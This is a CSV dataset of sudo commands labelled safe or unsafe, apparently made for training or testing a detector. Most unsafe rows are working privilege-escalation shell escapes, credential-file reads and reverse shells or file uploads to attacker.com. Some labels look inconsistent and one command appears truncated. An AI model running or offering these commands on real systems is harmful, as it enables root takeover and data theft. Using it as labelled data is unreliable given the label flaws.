isSafe,command
0,sudo batcat --paging always /etc/profile !/bin/sh 
0,LFILE=file_to_read sudo bc -s $LFILE quit 
0,sudo bconsole @exec /bin/sh 
0,"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'"
0,"LFILE=file_to_read sudo bridge -b ""$LFILE"" "
0,sudo bundle help !/bin/sh 
0,sudo bundler help !/bin/sh 
0,"sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2' "
0,sudo busybox sh
0,"TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF sudo byebug $TF continue "
0,LFILE=file_to_read sudo bzip2 -c $LFILE | bzip2 -d 
0,"sudo c89 -wrapper /bin/sh,-s ."
0,"sudo c99 -wrapper /bin/sh,-s ."
0,sudo cabal exec -- /bin/sh
0,sudo capsh --
0,"LFILE=file_to_read sudo cat ""$LFILE"" "
0,sudo cdist shell -s /bin/sh
0,TF=$(mktemp -d) sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0' 
0,"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx"
0,LFILE=file_to_read sudo check_cups --extra-opts=@$LFILE 
0,LFILE=file_to_write INPUT=input_file sudo check_log -F $INPUT -O $LFILE 
0,LFILE=file_to_read sudo check_memory --extra-opts=@$LFILE 
0,LFILE=file_to_read sudo check_raid --extra-opts=@$LFILE 
0,"COMMAND=id OUTPUT=output_file TF=$(mktemp) echo ""$COMMAND | tee $OUTPUT"" > $TF chmod +x $TF umask 022 check_ssl_cert --curl-bin $TF -H example.net cat $OUTPUT "
0,LFILE=file_to_read sudo check_statusfile $LFILE 
0,LFILE=file_to_change sudo chmod 6777 $LFILE 
0,sudo choom -n 0 /bin/sh
0,LFILE=file_to_change sudo chown $(id -un):$(id -gn) $LFILE 
0,sudo chroot / 
0,LFILE=file_to_read TF=$(mktemp -d) touch $TF/empty.yara sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p' 
0,LFILE=file_to_read sudo cmp $LFILE /dev/zero -b -l 
0,"TF=$(mktemp -d) echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x sudo cobc -xFj --frelax-syntax-checks $TF/x "
0,LFILE=file_to_read sudo column $LFILE 
0,LFILE=file_to_read sudo comm $LFILE /dev/null 2>/dev/null 
0,"TF=$(mktemp -d) echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json sudo composer --working-dir=$TF run-script x "
0,"TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowsay -f $TF x "
0,"TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowthink -f $TF x "
0,"LFILE=file_to_write echo ""DATA"" | sudo cp /dev/stdin ""$LFILE"" "
0,sudo cpan ! exec '/bin/bash' 
0,echo '/bin/sh </dev/tty >/dev/tty' >localhost sudo cpio -o --rsh-command /bin/sh -F localhost: 
0,sudo cpulimit -l 100 -f /bin/sh
0,sudo crash -h !sh 
0,sudo crontab -e
0,sudo csh
0,LFILE=file_to_read csplit $LFILE 1 cat xx01 
0,sudo csvtool call '/bin/sh;false' /etc/passwd
0,LFILE=file_to_read sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE 
0,URL=http://attacker.com/file_to_get LFILE=file_to_save sudo curl $URL -o $LFILE 
0,"LFILE=file_to_read sudo cut -d """""""" -f1 ""$LFILE"" "
0,sudo dash
0,LFILE=file_to_read sudo date -f $LFILE 
0,sudo dc -e '!/bin/sh'
0,"LFILE=file_to_write echo ""data"" | sudo dd of=$LFILE "
0,sudo debugfs !/bin/sh 
0,"LFILE=file_to_read sudo dialog --textbox ""$LFILE"" 0 0 "
0,LFILE=file_to_read sudo diff --line-format=%L /dev/null $LFILE 
0,LFILE=file_to_read sudo dig -f $LFILE 
0,sudo distcc /bin/sh
0,sudo dmesg -H !/bin/sh 
0,"LFILE=file_to_write sudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE"" "
0,sudo dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF sudo dmsetup ls --exec '/bin/sh -s' 
0,sudo dnf install -y x-1.0-1.noarch.rpm 
0,sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
0,"LFILE='\path\to\file_to_write' sudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit"
0,"sudo dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();; "
0,sudo dpkg -l !/bin/sh 
0,"echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py sudo dstat --xxx "
0,"tex '\special{psfile=""`/bin/sh 1>&0""}\end' sudo dvips -R0 texput.dvi "
0,"TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo easy_install $TF "
0,sudo eb logs !/bin/sh 
0,sudo ed !/bin/sh 
0,"LFILE=file_to_read sudo efax -d ""$LFILE"" "
0,sudo elvish
0,"sudo emacs -Q -nw --eval '(term ""/bin/sh"")'"
0,sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
0,sudo env /bin/sh
0,"LFILE=file_to_read sudo eqn ""$LFILE"" "
0,"LFILE=file_to_read sudo espeak -qXf ""$LFILE"" "
0,sudo ex !/bin/sh 
0,LFILE=file_to_write INPUT=input_file sudo exiftool -filename=$LFILE $INPUT 
0,"LFILE=file_to_read sudo expand ""$LFILE"" "
0,sudo expect -c 'spawn /bin/sh;interact'
0,"TF=$(mktemp -d) echo 'exec(""/bin/sh"")' > $TF/x.rb sudo FACTERLIB=$TF facter "
0,LFILE=file_to_read sudo file -f $LFILE 
0,sudo find . -exec /bin/sh \; -quit
0,sudo fish
0,sudo flock -u / /bin/sh
0,"LFILE=file_to_read sudo fmt -999 ""$LFILE"" "
0,"LFILE=file_to_read sudo fold -w99999999 ""$LFILE"" "
0,LFILE=file_to_read sudo fping -f $LFILE 
0,sudo ftp !/bin/sh 
0,"sudo gawk 'BEGIN {system(""/bin/sh"")}'"
0,"sudo gcc -wrapper /bin/sh,-s ."
0,sudo gcloud help !/bin/sh 
0,sudo gcore $PID
0,sudo gdb -nx -ex '!sh' -ex quit
0,"sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc"
0,sudo genie -c '/bin/sh'
0,"LFILE=file_to_read sudo genisoimage -q -o - ""$LFILE"" "
0,"sudo ghc -e 'System.Process.callCommand ""/bin/sh""'"
0,"sudo ghci System.Process.callCommand ""/bin/sh"" "
0,"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'"
0,sudo ginsh !/bin/sh 
0,"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help"
0,sudo grc --pty /bin/sh
0,LFILE=file_to_read sudo grep '' $LFILE 
0,TF=$(mktemp) echo '#!/bin/sh' > $TF echo 'exec /bin/sh 0<&1' >> $TF chmod +x $TF sudo gtester -q $TF 
0,LFILE=file_to_read sudo gzip -f $LFILE -t 
0,"LFILE=file_to_read sudo hd ""$LFILE"" "
0,"LFILE=file_to_read sudo head -c1G ""$LFILE"" "
0,"LFILE=file_to_read sudo hexdump -C ""$LFILE"" "
0,"LFILE=file_to_read sudo highlight --no-doc --failsafe ""$LFILE"" "
0,sudo hping3 /bin/sh 
0,"LFILE=file_to_read ./iconv -f 8859_1 -t 8859_1 ""$LFILE"" "
0,sudo iftop !/bin/sh 
0,LFILE=file_to_change TF=$(mktemp) sudo install -m 6777 $LFILE $TF 
0,sudo ionice /bin/sh
0,"LFILE=file_to_read sudo ip -force -batch ""$LFILE"" "
0,sudo irb exec '/bin/bash' 
0,sudo ispell /etc/passwd !/bin/sh 
0,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs"
0,sudo joe ^K!/bin/sh 
0,LFILE=file_to_read sudo join -a 2 /dev/null $LFILE 
0,sudo journalctl !/bin/sh 
0,"LFILE=file_to_read sudo jq -Rr . ""$LFILE"" "
0,"sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"""
0,sudo jtag --interactive shell /bin/sh 
0,sudo julia -e 'run(`/bin/sh`)' 
0,"sudo knife exec -E 'exec ""/bin/sh""' "
0,sudo ksh
0,LFILE=file_to_read sudo ksshell -i $LFILE 
0,sudo ksu -q -e /bin/sh
0,LFILE=dir_to_serve sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/ 
0,sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi 
0,"sudo latexmk -e 'exec ""/bin/sh"";'"
0,sudo /lib/ld.so /bin/sh
0,"TF=$(mktemp -d) echo ""$TF"" > ""$TF/conf"" # move malicious libraries in $TF sudo ldconfig -f ""$TF/conf"" "
0,sudo less /etc/profile !/bin/sh 
0,sudo lftp -c '!/bin/sh'
0,"LFILE=file_to_read sudo links ""$LFILE"" "
0,sudo ln -fs /bin/sh /bin/ln sudo ln 
0,sudo loginctl user-status !/bin/sh 
0,sudo logsave /dev/null /bin/sh -i
0,"LFILE=file_to_read sudo look '' ""$LFILE"" "
0,sudo ltrace -b -L /bin/sh
0,"sudo lua -e 'os.execute(""/bin/sh"")'"
0,"sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'"
0,"sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'"
0,URL=http://attacker.com/file_to_get LFILE=file_to_save sudo lwp-download $URL $LFILE 
0,"LFILE=file_to_read sudo lwp-request ""file://$LFILE"" "
0,sudo mail --exec='!/bin/sh'
0,"COMMAND='/bin/sh' sudo make -s --eval=$'x:\n\t-'""$COMMAND"" "
0,sudo man man !/bin/sh 
0,"sudo mawk 'BEGIN {system(""/bin/sh"")}'"
0,sudo minicom -D /dev/null 
0,TERM= sudo more /etc/profile !/bin/sh 
0,"LFILE=file_to_read sudo mosquitto -c ""$LFILE"" "
0,sudo mount -o bind /bin/sh /bin/mount sudo mount 
0,"sudo msfconsole msf6 > irb >> system(""/bin/sh"") "
0,LFILE=file_to_read sudo msgattrib -P $LFILE 
0,LFILE=file_to_read sudo msgcat -P $LFILE 
0,LFILE=file_to_read sudo msgconv -P $LFILE 
0,echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID' 
0,LFILE=file_to_read sudo msgmerge -P $LFILE /dev/null 
0,LFILE=file_to_read sudo msguniq -P $LFILE 
0,"LFILE=file_to_read sudo mtr --raw -F ""$LFILE"" "
0,sudo multitime /bin/sh
0,"LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF sudo mv $TF $LFILE "
0,sudo mysql -e '\! /bin/sh'
0,sudo nano ^R^X reset; sh 1>&0 2>&0 
0,LFILE=file_to_read sudo nasm -@ $LFILE 
0,"sudo nawk 'BEGIN {system(""/bin/sh"")}'"
0,RHOST=attacker.com RPORT=12345 sudo nc -e /bin/sh $RHOST $RPORT 
0,sudo ncdu b 
0,sudo ncftp !/bin/sh 
0,TF=$(mktemp) echo 'exec /bin/sh' >$TF sudo neofetch --config $TF 
0,"LFILE=file_to_read sudo nft -f ""$LFILE"" "
0,sudo nice /bin/sh
0,LFILE=file_to_read sudo nl -bn -w1 -s '' $LFILE 
0,LFILE=file_to_read sudo nm @$LFILE 
0,"TF=$(mktemp) echo 'os.execute(""/bin/sh"")' > $TF sudo nmap --script=$TF "
0,"sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)"""
0,"TF=$(mktemp -d) echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json sudo npm -C $TF --unsafe-perm i "
0,TF=$(mktemp -d) echo '#!/bin/sh' > $TF/groff echo '/bin/sh' >> $TF/groff chmod +x $TF/groff sudo GROFF_BIN_PATH=$TF nroff 
0,sudo nsenter /bin/sh
0,LFILE=file_to_read sudo ntpdate -a x -k $LFILE -d localhost 
0,"sudo octave-cli --eval 'system(""/bin/sh"")'"
0,"LFILE=file_to_read sudo od -An -c -w9999 ""$LFILE"" "
0,RHOST=attacker.com RPORT=12345 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s 
0,sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh' 
0,"COMMAND=id TF=$(mktemp -u) sudo openvt -- sh -c ""$COMMAND >$TF 2>&1"" cat $TF "
0,sudo opkg install x_1.0_all.deb 
0,"TF=$(mktemp) echo 'os.execute(""/bin/sh"")' >$TF sudo pandoc -L $TF /dev/null "
0,LFILE=file_to_read sudo paste $LFILE 
0,"TF=$(mktemp) echo 'import os; os.system(""/bin/sh"")' > $TF sudo pdb $TF cont "
0,sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' pdftotext article.pdf - 
0,sudo pdftex --shell-escape '\write18{/bin/sh}\end' 
0,sudo perf stat /bin/sh 
0,"sudo perl -e 'exec ""/bin/sh"";'"
0,sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
0,sudo pexec /bin/sh
0,sudo pg /etc/profile !/bin/sh 
0,"CMD=""/bin/sh"" sudo php -r ""system('$CMD');"" "
0,sudo pic -U .PS sh X sh X 
0,sudo pico ^R^X reset; sh 1>&0 2>&0 
0,COMMAND=id sudo pidstat -e $COMMAND 
0,"TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo pip install $TF "
0,sudo pkexec /bin/sh
0,sudo pkg install -y --no-repo-update ./x-1.0.txz 
0,sudo posh
0,LFILE=file_to_read pr -T $LFILE 
0,"sudo pry system(""/bin/sh"") "
0,sudo psftp !/bin/sh 
0,psql \? !/bin/sh 
0,"LFILE=file_to_read sudo ptx -w 5000 ""$LFILE"" "
0,"sudo puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }"" "
0,sudo pwsh
0,"sudo python -c 'import os; os.system(""/bin/sh"")'"
0,sudo rake -p '`/bin/sh 1>&0`'
0,sudo rc -c '/bin/sh'
0,LFILE=file_to_read sudo readelf -a @$LFILE 
0,sudo red file_to_write a DATA . w q 
0,"LFILE=file_to_read sudo redcarpet ""$LFILE"" "
0,"RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"" "
0,LFILE=file_to_read sudo rev $LFILE | rev 
0,sudo rlwrap /bin/sh
0,"sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'"
0,sudo rpmdb --eval '%(/bin/sh 1>&2)'
0,"sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'"
0,sudo rpmverify --eval '%(/bin/sh 1>&2)'
0,"sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null"
0,"sudo ruby -e 'exec ""/bin/sh""'"
0,sudo run-mailcap --action=view /etc/hosts !/bin/sh 
0,sudo run-parts --new-session --regex '^sh$' /bin
0,TF=$(mktemp) echo '! exec /bin/sh' >$TF sudo runscript $TF 
0,"sudo rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
0,"sudo rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
0,sudo sash
0,sudo scanmem shell /bin/sh 
0,"TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" sudo scp -S $TF x y: "
0,sudo screen
0,sudo script -q /dev/null
0,sudo scrot -e /bin/sh
0,sudo sed -n '1e exec sh 1>&0' /etc/hosts
0,sudo service ../../bin/sh
0,sudo setarch $(arch) /bin/sh
0,LFILE=file_to_change USER=somebody sudo setfacl -m -u:$USER:rwx $LFILE 
0,sudo setlock - /bin/sh
0,HOST=user@attacker.com sudo sftp $HOST !/bin/sh 
0,sudo sg root 
0,"LFILE=file_to_write sudo shuf -e DATA -o ""$LFILE"" "
0,"sudo slsh -e 'system(""/bin/sh"")'"
0,sudo smbclient '\\attacker\share' !/bin/sh 
0,sudo snap install xxxx_1.0_all.snap --dangerous --devmode 
0,sudo socat stdin exec:/bin/sh 
0,"LFILE=file_to_read sudo soelim ""$LFILE"" "
0,sudo softlimit /bin/sh
0,"LFILE=file_to_read sudo sort -m ""$LFILE"" "
0,sudo split --filter=/bin/sh /dev/stdin 
0,sudo sqlite3 /dev/null '.shell /bin/sh'
0,"sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')"""
0,LFILE=file_to_read sudo ss -a -F $LFILE 
0,sudo ssh-agent /bin/
0,sudo ssh-keygen -D ./lib.so
0,LFILE=file_to_read sudo ssh-keyscan -f $LFILE 
0,sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
0,sudo sshpass /bin/sh
0,sudo start-stop-daemon -n $RANDOM -S -x /bin/sh
0,sudo stdbuf -i0 /bin/sh
0,sudo strace -o /dev/null /bin/sh
0,"LFILE=file_to_read sudo strings ""$LFILE"" "
0,sudo su
0,sudo sudo /bin/sh
0,"COMMAND='/bin/sh -c id>/tmp/id' sudo sysctl ""kernel.core_pattern=|$COMMAND"" sleep 9999 & kill -QUIT $! cat /tmp/id "
0,TF=$(mktemp) echo /bin/sh >$TF chmod +x $TF sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice 
0,sudo systemd-resolve --status !sh 
0,"LFILE=file_to_read sudo tac -s 'RANDOM' ""$LFILE"" "
0,"LFILE=file_to_read sudo tail -c1G ""$LFILE"" "
0,sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
0,sudo task execute /bin/sh
0,sudo taskset 1 /bin/sh
0,sudo tasksh !/bin/sh 
0,LFILE=file_to_read sudo tbl $LFILE 
0,sudo tclsh exec /bin/sh <@stdin >@stdout 2>@stderr 
0,"COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root "
0,sudo tdbtool ! /bin/sh 
0,"LFILE=file_to_write echo DATA | sudo tee -a ""$LFILE"" "
0,RHOST=attacker.com RPORT=12345 sudo telnet $RHOST $RPORT ^] !/bin/sh 
0,"sudo terraform console file(""file_to_read"") "
0,sudo tex --shell-escape '\write18{/bin/sh}\end' 
0,RHOST=attacker.com sudo tftp $RHOST put file_to_send 
0,"LFILE=file_to_read sudo tic -C ""$LFILE"" "
0,sudo /usr/bin/time /bin/sh
0,sudo timedatectl list-timezones !/bin/sh 
0,sudo timeout --foreground 7d /bin/sh
0,sudo tmate -c /bin/sh
0,sudo tmux
0,echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc sudo top # press return twice reset 
0,sudo torify /bin/sh
0,sudo torsocks /bin/sh
0,LFILE=file_to_read sudo troff $LFILE 
0,"LFILE=file_to_read sudo ul ""$LFILE"" "
0,"LFILE=file_to_read sudo unexpand -t99999999 ""$LFILE"" "
0,"LFILE=file_to_read sudo uniq ""$LFILE"" "
0,sudo unshare /bin/sh
0,sudo unsquashfs shell ./squashfs-root/sh -p 
0,sudo unzip -K shell.zip ./sh -p 
0,"LFILE=/path/to/file_to_write TF=$(mktemp) echo DATA >$TF sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0 "
0,"LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode "
0,"LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode "
0,"cd $(mktemp -d) echo 'exec ""/bin/sh""' > Vagrantfile vagrant up "
0,sudo valgrind /bin/sh
0,"LFILE=file_to_write sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE"" "
0,sudo vi -c ':!/bin/sh' /dev/null
0,sudo view -c ':!/bin/sh'
0,sudo vigr
0,sudo vim -c ':!/bin/sh'
0,sudo vimdiff -c ':!/bin/sh'
0,sudo vipw
0,SCRIPT=script_to_run TF=$(mktemp) cat > $TF << EOF <domain type='kvm'>   <name>x</name>   <os>     <type arch='x86_64'>hvm</type>   </os>   <memory unit='KiB'>1</memory>   <devices>     <interface type='ethernet'>       <script path='$SCRIPT'/>     </interface>   </devices> </domain> EOF sudo virsh -c qemu:///system create $TF virsh -c qemu:///system destroy x 
0,"LFILE=file_to_read sudo w3m ""$LFILE"" -dump "
0,"LFILE=file_to_read sudo wall --nobanner ""$LFILE"" "
0,sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
0,"LFILE=file_to_read sudo wc --files0-from ""$LFILE"" "
0,TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF sudo wget --use-askpass=$TF 0 
0,"LFILE=file_to_read sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0 "
0,"PORT=4444 sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" & echo 'DATA' | nc -u 127.127.127.127 ""$PORT"" "
0,sudo wish exec /bin/sh <@stdin >@stdout 2>@stderr 
0,sudo xargs -a /dev/null sh
0,sudo xdg-user-dir '}; /bin/sh #' 
0,sudo xdotool exec --sync /bin/sh
0,sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi 
0,sudo xetex --shell-escape '\write18{/bin/sh}\end' 
0,LFILE=file_to_read sudo xmodmap -v $LFILE 
0,LFILE=file_to_read sudo xmore $LFILE 
0,"LFILE=file_to_read sudo xpad -f ""$LFILE"" "
0,"LFILE=file_to_read sudo xxd ""$LFILE"" | xxd -r "
0,"LFILE=file_to_read sudo xz -c ""$LFILE"" | xz -d "
0,sudo yarn exec /bin/sh
0,sudo yash
0,sudo yum localinstall -y x-1.0-1.noarch.rpm 
0,sudo zathura :! /bin/sh -c 'exec /bin/sh 0<&1' 
0,TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF 
0,sudo zsh
0,"LFILE=file_to_read sudo zsoelim ""$LFILE"" "
0,sudo zypper x 
0,sudo nmap --interactive
0,sudo vim -c '!sh'
0,"sudo awk 'BEGIN {system(""/bin/sh"")}'"
0,sudo bash
0,sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh
0,"sudo python -c 'import os; os.system(""/bin/sh"")'"
0,"sudo perl -e 'exec ""/bin/sh"";'"
0,sudo find . -exec /bin/sh \;
0,sudo less /etc/shadow
0,sudo man -P /bin/sh man
0,sudo ftp
0,sudo env /bin/sh
0,sudo gdb -ex '!sh' -q
0,"sudo ruby -e 'exec ""/bin/sh""'"
0,"sudo lua -e 'os.execute(""/bin/sh"")'"
0,sudo more /etc/shadow
0,"sudo socat tcp-connect:localhost:8080 exec:'/bin/sh',pty,stderr,setsid,sigint,sane"
0,sudo tar -cf /dev/null /dev/null --checkpoint-action=exec=/bin/sh
0,sudo tee /root/file.txt
0,sudo vi -c ':!/bin/sh'
0,sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
0,sudo zip myarchive.zip /etc/shadow -T -TT '/bin/sh'
0,sudo base64 /dev/urandom > /dev/shm/outfile
0,sudo xxd /etc/shadow
0,sudo mysql -e 'system /bin/sh'
0,"sudo tshark -i lo -z exec,/bin/sh"
0,sudo git -p help config
0,"sudo php -r 'system(""/bin/sh"");'"
0,"sudo awk 'BEGIN {system(""/bin/bash"")}'"
0,sudo nano /etc/shadow
0,sudo chown root:root /bin/bash
0,sudo chmod u+s /bin/bash
0,sudo apt-get update && sudo apt-get install --reinstall sudo
0,"sudo python3 -c 'import os; os.system(""/bin/sh"")'"
0,sudo gcc exploit.c -o exploit && sudo ./exploit
0,sudo rvim -c ':!/bin/bash'
0,"sudo node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'"
0,sudo ldd /bin/sh
0,sudo rview -c ':!/bin/bash'
0,sudo ncat -e /bin/sh localhost 8080
0,sudo smbclient \\localhost\share -c '!/bin/sh'
0,sudo bash -c 'exec /bin/sh'
0,sudo less -f /etc/shadow
0,sudo more -f /etc/shadow
0,sudo csh -c 'exec /bin/sh'
0,sudo expect -c 'spawn /bin/sh; interact'
1,sudo ls /root
1,sudo cat /etc/passwd
1,sudo systemctl status apache2
1,sudo service ssh restart
1,sudo cp /var/log/syslog /home/user/
1,sudo rm -rf /tmp/*
1,sudo mv /home/user/file.txt /root/
1,sudo chmod 644 /var/www/html/index.html
1,sudo chown user:user /var/www/html/index.html
1,sudo apt-get update
1,sudo apt-get upgrade
1,sudo yum install httpd
1,sudo dnf remove nginx
1,sudo adduser newuser
1,sudo passwd newuser
1,sudo visudo
1,sudo iptables -L
1,sudo ifconfig eth0 up
1,sudo df -h
1,sudo du -sh /var/log
1,sudo tar -czvf backup.tar.gz /home/user/
1,sudo unzip archive.zip -d /opt/
1,sudo kill -9 12345
1,sudo pkill -f apache2
